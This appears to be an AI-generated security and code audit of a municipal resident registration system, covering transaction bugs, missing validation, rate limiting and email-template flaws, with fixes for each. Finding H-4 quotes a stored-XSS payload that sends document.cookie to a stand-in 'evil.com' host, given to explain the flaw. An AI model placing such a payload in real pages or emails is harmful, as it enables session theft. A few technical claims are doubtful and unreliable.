# Resident Registration Stack — Audit Report

**Date:** 2026-05-05
**Auditor:** Claude Code (Sisyphus)
**Scope:** Registration flow across Programs Portal + E-Services Portal → shared backend → PostgreSQL
**Systems Audited:**
- E-Services Frontend (`ResidentRegister.tsx`)
- Programs Portal Frontend (`Register.tsx`)
- E-Services Backend (`portal-registration.service.ts`, `portal-registration.routes.ts`, `portal-registration.controller.ts`)
- Classification Service (`classification.service.ts`)
- Email Service + Templates (`email.service.ts`, `resident-notifications.ts`, `base-template.ts`)
- Auth Middleware (`auth.ts`)
- Database Schema (`schema.sql`, `schema.prisma`)

**Method:** 7 parallel audit agents covering: DB schema integrity, auto-classification logic, frontend form validation, service bugs, routes security, email flow, resident ID generation.

---

## 1. Executive Summary

| Status | Count |
|---|---|
| 🔴 CRITICAL — Fix before any deployment | 5 |
| 🟠 HIGH — Fix before production | 13 |
| 🟡 MEDIUM — Fix after initial deployment | 25+ |
| 🟢 LOW — Informational / Design | 12+ |

**Total issues found across all layers: ~55**

The resident registration stack has 5 critical issues that can cause data corruption, security breaches, or complete audit trail loss. None of the critical issues require code redesign — all are fixable with targeted changes. However, 3 of the 5 criticals involve transaction atomicity and cross-system auth confusion that indicate a need for careful review before any production deployment.

---

## 2. Critical Issues

### 🔴 R-1: Classification runs AFTER approval transaction commits — silent failure path

**Severity:** CRITICAL
**Source:** Auto-classification audit (`bg_5d1ba8eb`)
**File:** `portal-registration.service.ts` lines 640–680

**The problem:** The approval transaction (resident + registration_request update) commits at line 661. The `autoClassifyResident` call at line 667 runs **after** the commit. If it throws, the error is caught and logged — but the resident is already permanently marked `active` and `approved`.

```typescript
// Lines 643–680
await prisma.$transaction([   // ← Commits here (line 661)
  prisma.resident.update({ ... data: { status: 'active', residentId } }),
  prisma.registrationRequest.update({ ... data: { status: 'approved' } }),
]);

// OUTSIDE the transaction — runs after commit
if (classifyMunicipalityId) {
  try {
    await autoClassifyResident(resident.id, classifyMunicipalityId, { ... });
  } catch (err: any) {
    console.error(`[auto-classify] autoClassifyResident error: ${err.message}`);
    // Swallowed — no indication to admin or user that classification failed
  }
}

return { residentId, status: 'approved', emailSent: true };  // ← Returns success regardless
```

**Impact:** Resident is `active` but has zero classifications. No senior citizen, PWD, student, solo parent, or voter records are created. The admin receives no indication of failure. The resident may not receive benefits they qualify for.

**Additional bug in the same flow:** `syncBeneficiaryOnInsert` in `classification.service.ts` line 409 has a string manipulation bug:
```typescript
table.replace(/_([a-z])/g, (g) => g[1].toUpperCase()).replace(/s$/, '')
// 'pwd_beneficiaries' → 'pwdBeneficiar' (wrong — should be 'pWDBeneficiary')
```
This would crash at runtime when syncing PWD or student beneficiary records.

**Fix:** Move `autoClassifyResident` **inside** the `prisma.$transaction`. If classification fails, the entire approval rolls back. Alternatively, implement a reconciliation job that runs post-commit and flags unclassified approved residents.

---

### 🔴 R-2: `bimsUserId` is never set — all admin actions store reviewer ID = 0

**Severity:** CRITICAL
**Source:** Routes security audit (`bg_c64bd57d`)
**Files:** `portal-registration.controller.ts` lines 236, 257, 300; `auth.ts` lines 209–225

Every admin controller reads `(req as any).bimsUserId` which is **never set by any middleware in the entire codebase**:

```typescript
// portal-registration.controller.ts:236
const reviewerId = (req as any).bimsUserId; // "set by BIMS auth middleware" — but no such middleware exists
const result = await markUnderReview(id, reviewerId);

// portal-registration.controller.ts:257
const reviewerId = (req as any).bimsUserId;
await reviewRegistrationRequest(id, {
  action,
  adminNotes,
  reviewerId: Number(reviewerId),  // Number(undefined) === NaN
});
```

`Number(undefined)` evaluates to `NaN`. Prisma coerces `NaN` to `0` when writing to `reviewedBy Int?`. **Every approve/reject/resubmission action records `reviewedBy = 0`** — the audit trail is permanently corrupted.

**Root cause confusion:** The route comment says "BIMS ADMIN — verifyAdmin — eservice_users admin token". `verifyAdmin` (auth.ts:209) validates against `eservice_users` JWTs (UUID-based). But `reviewedBy` in `registrationRequest` is `Int` (meant for `bims_users.id`). These are separate identity systems with no bridging mechanism.

**Fix:** Determine the intended cross-system auth architecture. Either:
1. Add a BIMS proxy middleware that sets `X-BIMS-User-Id` header when BIMS forwards admin requests, OR
2. Store `reviewedBy` as `String` (UUID from `eservice_users`) instead of `Int`, OR
3. Remove the cross-system comment and use a consistent local admin identity

---

### 🔴 R-3: Ghost counter — `generateResidentId` outside the approval transaction

**Severity:** CRITICAL
**Source:** ID generation audit (`bg_594185a6`)
**File:** `portal-registration.service.ts` lines 640–661

```typescript
// Line 640: Counter increment happens BEFORE the transaction — completely outside it
const residentId = await generateResidentId(municipalityId, year);

// Lines 643–661: Resident + request update are in a transaction
await prisma.$transaction([
  prisma.resident.update({ where: { id: resident.id }, data: { residentId, status: 'active', ... } }),
  prisma.registrationRequest.update({ where: { id: requestId }, data: { status: 'approved', ... } }),
]);
```

If the transaction fails after the counter has been incremented and committed (DB write error, connection drop, constraint violation), the counter has been permanently incremented — but no resident has that ID. **Permanent sequence gaps.**

**Fix:** Move the counter increment **inside** the `prisma.$transaction`. Use `SELECT FOR UPDATE` within the transaction to read and increment atomically:

```typescript
await prisma.$transaction(async (tx) => {
  // Atomic increment inside transaction
  const [{ counter, prefix }] = await tx.$queryRaw<[{ counter: number; prefix: string }]>`
    SELECT counter, prefix FROM public.resident_counters
    WHERE municipality_id = ${municipalityId} AND year = ${year}
    FOR UPDATE
  `;
  await tx.$executeRaw`
    UPDATE public.resident_counters
    SET counter = counter + 1
    WHERE municipality_id = ${municipalityId} AND year = ${year}
  `;
  const newCounter = counter + 1;
  const residentId = `${prefix}-${year}-${String(municipalityId).padStart(3,'0')}${String(newCounter).padStart(4,'0')}`;

  await tx.resident.update({ where: { id: resident.id }, data: { residentId, status: 'active' } });
  await tx.registrationRequest.update({ where: { id: requestId }, data: { status: 'approved' } });
});
```

---

### 🔴 R-4: Counter format overflows at exactly 10,000 residents/year/municipality

**Severity:** CRITICAL (latent)
**Source:** ID generation audit (`bg_594185a6`)
**File:** `portal-registration.service.ts` line 878

```typescript
const cntPart = String(counter).padStart(4, '0');  // max 4 digits = 9999
```

When `counter = 10000`, `padStart(4, '0')` produces `"10000"` (5 digits). The resident ID becomes `RES-2025-000110000` — an 8-digit suffix instead of the expected 7-digit format. The column is `varchar(25)` so it fits, but the format contract is violated.

**Also:** Municipality IDs ≥ 1000 produce a 4-digit `munPart`, making the suffix ambiguous (can't determine where municipality ends and counter begins).

**Fix:** Change `padStart(4, '0')` → `padStart(7, '0')` to allow up to 10 million IDs per municipality per year. Alternatively, use a non-digit separator: `RES-{year}-{municipality_id}-{counter}`.

---

### 🔴 R-5: Selfie upload has NO file size limit (both frontend portals)

**Severity:** CRITICAL
**Source:** Frontend audit (`bg_b413474f`)
**Files:** `ResidentRegister.tsx` lines 1614–1619; `Register.tsx` lines 1666–1671

```typescript
// Profile photo — has 5MB check ✅
if (file.size > 5 * 1024 * 1024) { toast(...); return; }

// ID document — has 5MB check ✅
if (file.size > 5 * 1024 * 1024) { ... return; }

// Selfie — NO size check ❌
const base64 = await fileToBase64(file);  // Arbitrarily large image accepted
step3Form.setValue('selfieUrl', base64);
```

**Impact:** Users can upload images of any size. The base64 data is sent in the JSON payload, stored in the database, and can cause memory exhaustion on the server, huge database rows, and crashed API responses.

**Fix:** Add the same 5MB check used for profile photo and ID document:
```typescript
if (file.size > 5 * 1024 * 1024) {
  toast({ variant: 'destructive', title: 'File too large', description: 'Maximum file size is 5MB.' });
  return;
}
```

---

## 3. High Priority Issues

### 🟠 H-1: Backend has ZERO Zod validation — entire req.body passed raw to service

**File:** `portal-registration.controller.ts` (entire file)

No Zod schema validation is applied at any registration endpoint. The entire `req.body` is destructured and forwarded to the service with only basic type coercion (`Number()`, `Boolean()`). Attackers can submit:
- Non-existent `barangayId` values
- `birthdate` as `"not-a-date"`
- `password: ""`
- `monthlyIncome: -999999`
- Fields exceeding reasonable lengths

**Fix:** Add Zod validation schemas for all four controllers. At minimum:
```typescript
const submitSchema = z.object({
  firstName: z.string().min(1).max(100),
  lastName: z.string().min(1).max(100),
  email: z.string().email(),
  barangayId: z.number().int().positive(),
  password: z.string().min(8),
  // ... all other fields with appropriate types and constraints
});
```

---

### 🟠 H-2: `GET /status/:username` has no rate limiting — username enumeration

**File:** `portal-registration.routes.ts` line 45

```typescript
router.get('/status/:username', getRegistrationStatusController);  // No rate limiter
```

An attacker can enumerate all valid usernames by brute-forcing the parameter. The response reveals whether a username exists and returns the resident's name, application status, and admin notes. Combined with `POST /resubmit` (also unrated), an attacker can force-document-overwrite attacks on any enumerated username.

**Fix:** Apply `registrationLimiter` (3 req/hr per IP) to this endpoint as well.

---

### 🟠 H-3: `registrationLimiter` is skipped entirely in non-production

**File:** `portal-registration.routes.ts` line 31

```typescript
const registrationLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 3,
  skip: () => process.env.NODE_ENV !== 'production',  // ← Skipped in dev/staging
});
```

Automated scripts can submit unlimited fraudulent registrations in development or staging environments.

**Fix:** Remove the `skip` condition, or use a less restrictive limit in non-production (e.g., 100/hr instead of 3/hr).

---

### 🟠 H-4: `adminNotes` field is unvalidated — stored XSS vector

**Files:** `portal-registration.controller.ts` lines 256, 299; `resident-notifications.ts` lines 85, 129

`adminNotes` is passed directly into HTML email templates without sanitization:

```typescript
// resident-notifications.ts:85
const content = data.adminNotes
  ? getAlertBox(data.adminNotes, 'danger')  // ← Direct string interpolation
  : '';

// base-template.ts:193 — getAlertBox
`<p style="...">${message}</p>`  // ← message is adminNotes, no escaping
```

An admin entering `<script>document.location='https://evil.com?c='+document.cookie</script>` as rejection notes executes in the resident's email client (many clients block inline scripts, but not all).

**Also:** `residentName` in the email greeting is interpolated without escaping.

**Fix:** Sanitize `adminNotes` with `DOMPurify` before HTML interpolation, or at minimum escape HTML entities (`<`, `>`, `&`, `"`, `'`).

---

### 🟠 H-5: `monthlyIncome: 0` becomes `null` — wrong operator

**File:** `portal-registration.service.ts` line 165

```typescript
monthlyIncome: data.monthlyIncome ? data.monthlyIncome : null,  // 0 is falsy → null
```

A resident earning exactly ₱0 gets stored as `null`, breaking income-based eligibility checks.

**Fix:** Use nullish coalescing: `monthlyIncome: data.monthlyIncome ?? null`

---

### 🟠 H-6: Senior citizen age calculation has timezone and leap year edge cases

**File:** `portal-registration.service.ts` lines 536–547

```typescript
const ageDays = (Date.now() - new Date(resident.birthdate).getTime()) / 86400000;
if (ageDays >= 60 * 365.25) {
  toInsert.push({ type: 'Senior Citizen', ... });
}
```

Issues:
1. If `resident.birthdate` is stored as a date-only string (`'1990-01-15'`), `new Date('1990-01-15')` interprets it as midnight UTC. If the server is in UTC+8, the calculation has an 8-hour offset — a person born Jan 15, 1965 would be classified as 60 years old one day early.
2. Someone born Feb 29 is excluded one day early each non-leap year anniversary.

**Fix:** Use a proper date-based age calculation:
```typescript
function calculateAge(birthdate: Date): number {
  const today = new Date();
  let age = today.getFullYear() - birthdate.getFullYear();
  const monthDiff = today.getMonth() - birthdate.getMonth();
  if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthdate.getDate())) {
    age--;
  }
  return age;
}
```

---

### 🟠 H-7: `generateBeneficiaryId` has TOCTOU race condition

**File:** `classification.service.ts` lines 253–281

Two simultaneous `syncBeneficiaryOnInsert` calls for the same beneficiary type can read the same max `displayId` and both return the same value. The second insert fails with a unique constraint violation.

**Fix:** Use `SELECT FOR UPDATE` on the max query within a transaction, or use a sequence.

---

### 🟠 H-8: `resubmitDocuments` allows `null` `idDocumentUrl` to overwrite existing proof

**File:** `portal-registration.service.ts` lines 795–826

```typescript
prisma.resident.update({
  data: { proofOfIdentification: idDocumentUrl },  // Can be null!
}),
```

If `idDocumentUrl` is passed as `null` or `''`, the existing proof-of-ID is overwritten with null. No validation prevents this.

**Fix:** Add validation: `if (!idDocumentUrl) throw new Error('ID document URL is required');`

---

### 🟠 H-9: Username in resubmission URL not URL-encoded — open redirect risk

**File:** `portal-registration.service.ts` lines 778–780

```typescript
statusUrl: `${process.env.PORTAL_URL}/portal/register/status?username=${request.resident.username}`
```

If `username` contains special characters (`&`, `#`, `%`), the URL breaks. More critically, if `PORTAL_URL` env var is compromised/injected, the email link redirects to an arbitrary origin.

**Fix:** `encodeURIComponent(request.resident.username)`. Validate `PORTAL_URL` against an allowlist of trusted origins.

---

### 🟠 H-10: No cleanup of classifications/beneficiary records on rejection

**File:** `portal-registration.service.ts` lines 704–740 (reject flow)

When a registration is rejected, `resident_classifications` and beneficiary table records are not deleted. When the same resident re-registers and is approved again, `ON CONFLICT DO NOTHING` prevents duplicate classification inserts — but beneficiary records that are `ACTIVE` from a prior approval are not updated. A rejected resident re-approved may retain stale beneficiary records.

**Fix:** Delete `resident_classifications` and reset beneficiary records when rejecting, or document this as expected behavior with a reconciliation process.

---

### 🟠 H-11: Employment status mapping — no whitespace normalization

**File:** `portal-registration.service.ts` lines 453–458

```typescript
const EMPLOYMENT_STATUS_TO_CLASSIFICATION: Record<string, string> = {
  unemployed: 'Unemployed',
  'self-employed': 'Self Employed',
  retired: 'Retired',
  student: 'Student',
};
```

Exact string match — no trim. If frontend sends `'self-employed '` (trailing space) or `'Self-Employed'` (hyphen variation), the lookup fails silently and no classification is created.

**Fix:** Normalize before lookup: `const key = (formData.employmentStatus || '').trim().toLowerCase();`

---

### 🟠 H-12: `resubmitDocuments` resets request to `pending` but resident status stays `rejected`

**File:** `portal-registration.service.ts` lines 808–817

The `registrationRequest.status` is set back to `'pending'`, but `resident.status` is not reset — it remains `'rejected'`. After resubmission, the resident's account status is still `rejected` while the request is `pending`. Downstream logic checking "can this resident log in?" may incorrectly deny access.

**Fix:** Also update `resident.status` to `'pending'` in the same transaction.

---

### 🟠 H-13: `indigenousPerson` classified but never synced to any beneficiary table

**File:** `classification.service.ts` lines 135–141

`'Indigenous Person'` is inserted into `resident_classifications` but is **absent from `BENEFICIARY_SYNC_MAP`**. `syncBeneficiaryOnInsert` returns early for this type. No beneficiary record is created. This appears intentional but is undocumented.

**Fix:** Document the design decision, or add `'Indigenous Person'` to the sync map if beneficiary tracking is needed.

---

## 4. Medium Priority Issues

### DB Schema

**M-DB-1: Deleting a barangay hard-deletes residents via FK chain**

`households.house_head → residents(id) ON DELETE CASCADE` + `households.barangay_id → barangays(id) ON DELETE CASCADE` means: deleting a barangay cascades to households, which cascades to residents who are household heads. Residents who are NOT household heads survive but lose their `barangay_id` (SET NULL). This unintended blast radius means barangay cleanup can permanently delete residents.

**Fix:** Change `households.house_head` from `ON DELETE CASCADE` to `ON DELETE RESTRICT` or `SET NULL`.

**M-DB-2: Beneficiary FKs missing `ON DELETE` behavior**

`pwd_beneficiaries.disability_type_id`, `student_beneficiaries.grade_level_id`, and `solo_parent_beneficiaries.category_id` FKs have no `ON DELETE` specified — defaults to `NO ACTION`. Deleting a `social_amelioration_setting` is blocked by any existing beneficiary record.

**Fix:** Add `ON DELETE SET NULL` to all three FKs.

**M-DB-3: No status-transition validation trigger on `residents` table**

Invalid transitions like `pending → deceased` or `rejected → active` are silently allowed by the database. The application must enforce all status transition rules.

**Fix:** Add a trigger to validate status transitions, or document that all transition enforcement is application-layer only.

---

### Service Layer

**M-SV-1: `markUnderReview` — TOCTOU race on status transition**

Lines 421–437: Check-then-act is not atomic. Two admins clicking "Start Review" simultaneously could both pass the `status !== 'pending'` check before either updates. One succeeds, the other throws.

**Fix:** Use `updateMany` with a status filter:
```typescript
const updated = await prisma.registrationRequest.updateMany({
  where: { id: requestId, status: 'pending' },
  data: { status: 'under_review', reviewedBy: reviewerId },
});
if (updated.count === 0) throw new Error('Request is no longer pending');
```

**M-SV-2: `submitRegistration` — password hashed before validation**

Line 140: `hashPassword(data.password)` is called before duplicate checks and barangay validation. Wasted CPU on unusable passwords. A DoS attacker could flood the server with invalid submissions.

**Fix:** Validate before hashing.

**M-SV-3: `getRegistrationStatus` returns `'not_submitted'` — ambiguous string**

Line 250: `'not_submitted'` is not a valid `RegistrationRequest` status. Callers may not handle it.

**Fix:** Return `null` or use a proper discriminated union type.

**M-SV-4: `generateResidentId` called after municipality null check throws**

Line 637: Municipality check happens before the transaction. If null, it throws after the resident has already been updated to `active` — but the transaction hasn't committed yet. The error is unhandled.

**Fix:** Move the municipality check **before** the transaction start.

---

### Email Flow

**M-EM-1: SMTP failures — no retry, no dead-letter queue, no admin notification**

`sendEmailSafely` returns `false` on failure and logs to console. No retry mechanism, no background queue, no admin alert. If SMTP is down at the time of approval, the email is permanently lost.

**Fix:** Enqueue failed emails in a Redis/BullMQ queue for retry with exponential backoff.

**M-EM-2: `PORTAL_URL` used as redirect base without validation**

Lines 690, 778: If `PORTAL_URL` is set to `http://evil.com`, email links redirect there. This is an open redirect if the env var can be influenced by deployment configuration drift.

**Fix:** Validate `PORTAL_URL` against a allowlist of known-good origins.

**M-EM-3: All email templates hardcoded in English — no i18n**

All strings are inline English. For a multilingual Philippines population, this is a significant accessibility gap.

**Fix:** Introduce i18n keys and a translation system.

**M-EM-4: README env var name mismatch**

README.md references `EMAIL_FROM` but code uses `SMTP_FROM`. Developers following the README will not have email working.

**Fix:** Align the README with the actual `.env.example`.

---

### Frontend

**M-FE-1: Email uniqueness check has no submit-time guard**

`checkEmailExists` runs on `onBlur` only. A user can change their email after the blur check, then immediately submit. The backend catches the duplicate, but the UX is poor.

**Fix:** Re-check email at submit time, or disable the submit button while `emailExists === null`.

**M-FE-2: Photo upload failure leaves stale state**

When photo upload fails, `photoPreview` is set to `null` but `formData.picturePath` retains the failed URL. The user may not realize the photo wasn't updated and submits with broken data.

**Fix:** Clear `formData.picturePath` in the catch block alongside `photoPreview`.

**M-FE-3: Base64 uploads bypass multer's 5MB server-side limit**

The backend's 5MB multer limit only applies to multipart file uploads, not the base64 JSON strings used for ID documents and selfie. No server-side size enforcement exists for these fields.

**Fix:** Add explicit size validation in the service before storing base64.

**M-FE-4: Disability level "Profound" missing in `Register.tsx`**

`ResidentRegister.tsx` has 4 options (Mild, Moderate, Severe, Profound). `Register.tsx` only has 3 (Mild, Moderate, Severe). Users in the Programs Portal cannot select "Profound".

**Fix:** Align the `disabilityLevel` Select options between both files.

**M-FE-5: `acrNo` has no format validation (frontend or backend)**

 ACR numbers have a specific format (e.g., `SR-12345678`). The schema accepts any string ≤50 chars.

**Fix:** Add a regex validation for Philippine ACR format.

**M-FE-6: No form state persistence — page refresh loses all data**

A 4-step wizard with significant data entry has no localStorage backup. Users who accidentally refresh lose everything.

**Fix:** Persist form data and step number to sessionStorage on each step completion.

**M-FE-7: File upload `div`s are not keyboard accessible**

All three upload areas (`div onClick`) lack `onKeyDown`, `role="button"`, and `tabIndex`. Keyboard users cannot trigger file pickers.

**Fix:** Add keyboard event handlers and proper ARIA attributes.

**M-FE-8: Two portals navigate to different post-registration routes**

`ResidentRegister.tsx` navigates to `/portal/register/status`. `Register.tsx` navigates to `/register/status`. If the Programs Portal route doesn't exist, users see a 404 after registering.

**Fix:** Align post-registration navigation between both portals.

---

## 5. Low Priority / Informational

| ID | Category | Issue | Source |
|---|---|---|---|
| L-1 | Auth | `verifyAdmin` has no role check — any admin can manage registrations | Routes |
| L-2 | Security Headers | `styleSrc: "'unsafe-inline'"` weakens CSP | `index.ts` |
| L-3 | Security Headers | `X-Frame-Options` not set | `index.ts` |
| L-4 | Security Headers | `Permissions-Policy` not set | `index.ts` |
| L-5 | API Design | `DELETE /requests/rejected` uses query param, not resource ID — REST anti-pattern | Routes |
| L-6 | Auth | `POST /resubmit` is unauthenticated — only username guards it | Routes |
| L-7 | Service | `toUserMessage` substring allowlist can miss error messages | Controller |
| L-8 | Service | Password hashed before validation (resource waste) | Service |
| L-9 | Email | `sendEmailSafely` is not truly non-blocking — awaits nodemailer | Email |
| L-10 | Email | `residentName` interpolated into email HTML without escaping | Email |
| L-11 | Frontend | `usernameAvailable` check floods API with no debounce | Frontend |
| L-12 | DB | `registration_requests.created_at` missing index for queue ordering | DB Schema |

---

## 6. Previously Known Issues (Now Verified Fixed)

| Issue | Status | Notes |
|---|---|---|
| `resident_classifications_unique_type` constraint missing | ✅ Fixed (v2 patch, schema.sql lines 1813–1821) | Composite unique on `(resident_id, classification_type)` now exists |
| `pwd_beneficiaries` missing unique constraint on `resident_id` | ✅ Fixed | `pwd_resident_id_key` exists (schema.sql line 1324) |
| `senior_citizen_beneficiaries` missing unique constraint | ✅ Fixed | `scb_resident_id_key` exists (schema.sql line 1321) |

---

## 7. Transaction Safety Assessment

| Operation | Safe? | Notes |
|---|---|---|
| `submitRegistration` (lines 143–201) | ✅ | All 3 inserts in one `$transaction` |
| `reviewRegistrationRequest` approve (lines 643–661) | ✅ | Both updates in one `$transaction` |
| `reviewRegistrationRequest` reject (lines 706–723) | ✅ | Both updates in one `$transaction` |
| `resubmitDocuments` (lines 808–823) | ✅ | Both updates in one `$transaction` |
| `autoClassifyResident` (lines 576–612) | ⚠️ | Each classification is individual `$executeRaw` + `syncBeneficiaryOnInsert` — not atomic across types |
| `syncBeneficiaryOnInsert` pension sync (lines 231–240) | ✅ | Nested `$transaction` for pivot deletes + inserts |
| `generateResidentId` | 🔴 | **Not in any transaction — ghost counter bug** |

---

## 8. Files Audited (Line Counts)

| File | Lines | Primary Audit Focus |
|---|---|---|
| `portal-registration.service.ts` | 880 | Service bugs, transaction atomicity, ID generation |
| `portal-registration.routes.ts` | ~100 | Auth, rate limiting, route security |
| `portal-registration.controller.ts` | ~350 | Input validation, error masking |
| `classification.service.ts` | ~428 | Beneficiary sync, race conditions, model name bug |
| `resident-notifications.ts` | 168 | Email XSS, adminNotes injection |
| `base-template.ts` | ~300 | HTML interpolation safety |
| `email.service.ts` | ~200 | SMTP failures, non-blocking claim |
| `auth.ts` | ~300 | verifyAdmin, eservice vs bims confusion |
| `schema.sql` | 1865 | FK constraints, cascade delete, indexes, triggers |
| `schema.prisma` | 976 | ORM-level constraints, reviewedBy type mismatch |
| `ResidentRegister.tsx` | ~1900 | Form validation, selfie upload, amelioration logic |
| `Register.tsx` | ~1900 | Same as above, diffs noted |

---

## 9. Priority Fix Checklist

### P0 — Must Fix Before Any Deployment
- [ ] **R-1:** Move `autoClassifyResident` inside the approval transaction, or make classification failure block approval
- [ ] **R-1:** Fix `prisma.pwdBeneficiar` string manipulation bug in `syncBeneficiaryOnInsert`
- [ ] **R-2:** Bridge `bimsUserId` — determine cross-system auth architecture
- [ ] **R-3:** Move `generateResidentId` inside the `prisma.$transaction` (FOR UPDATE pattern)
- [ ] **R-4:** Change `padStart(4)` → `padStart(7)` on counter
- [ ] **R-5:** Add 5MB size validation to selfie upload handler (both frontend portals)
- [ ] **H-1:** Add Zod validation schema for `submitRegistrationController`
- [ ] **H-3:** Remove `skip: () => process.env.NODE_ENV !== 'production'` from `registrationLimiter`

### P1 — Fix Before Production
- [ ] **H-4:** Sanitize `adminNotes` before HTML interpolation (DOMPurify or HTML entity escape)
- [ ] **H-4:** Escape `residentName` in email greeting
- [ ] **H-5:** Fix `monthlyIncome` ternary → `??`
- [ ] **H-6:** Fix age calculation (proper date-based approach)
- [ ] **H-7:** Fix `generateBeneficiaryId` race (SELECT FOR UPDATE)
- [ ] **H-8:** Validate `idDocumentUrl` is non-null in `resubmitDocuments`
- [ ] **H-9:** `encodeURIComponent(username)` in resubmission email URL
- [ ] **H-9:** Validate `PORTAL_URL` against allowlist
- [ ] **H-10:** Add cleanup of classifications/beneficiary records on rejection, or document behavior
- [ ] **H-11:** Normalize employment status keys before Record lookup
- [ ] **H-12:** Reset `resident.status` to `'pending'` in `resubmitDocuments`
- [ ] **M-DB-1:** Change `households.house_head` from `CASCADE` to `RESTRICT`/`SET NULL`
- [ ] **M-DB-2:** Add `ON DELETE SET NULL` to three beneficiary FKs
- [ ] **M-SV-1:** Use `updateMany` with status filter in `markUnderReview`
- [ ] **H-2:** Apply rate limiting to `/status/:username` endpoint

### P2 — After Initial Deployment
- [ ] **M-EM-1:** Add retry queue for failed emails (BullMQ + Redis)
- [ ] **M-EM-3:** Introduce i18n for email templates
- [ ] **M-FE-1:** Add submit-time email guard
- [ ] **M-FE-4:** Align disability level options between portals
- [ ] **M-FE-6:** Add form state persistence (sessionStorage)
- [ ] **M-FE-7:** Keyboard accessibility for upload divs
- [ ] **M-SV-2:** Validate before hashing password
- [ ] **M-EM-4:** Fix README env var name (`EMAIL_FROM` → `SMTP_FROM`)

---

## 10. Test Coverage Assessment

**No test files exist** for `portal-registration.service.ts` (confirmed by grep across the backend directory). This service handles critical government identity data and financial benefit eligibility. Comprehensive unit and integration tests are required before production — covering:
- Happy path registration submission
- Duplicate username/email rejection
- Invalid barangay ID rejection
- Concurrent approval race conditions
- Rejection → resubmission → re-approval flow
- Classification auto-generation on approval
- Email sending success and failure paths
- Resident ID generation under concurrent load

---

*Report generated: 2026-05-05*
*Auditor: Claude Code (Sisyphus) — 7 parallel audit agents*
